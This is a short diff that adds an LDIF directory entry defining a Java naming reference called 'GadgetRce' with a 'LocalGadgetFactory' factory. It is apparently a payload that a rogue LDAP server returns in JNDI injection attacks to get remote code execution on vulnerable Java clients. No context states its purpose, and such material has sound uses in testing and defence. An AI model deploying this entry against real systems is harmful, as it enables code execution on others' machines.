@@ -1,0 +1,7 @@
+dn: cn=GadgetRce,dc=nodomain
+objectClass: top
+objectClass: javaContainer
+objectClass: javaNamingReference
+cn: GadgetRce
+javaClassName: java.lang.String
+javaFactory: LocalGadgetFactory
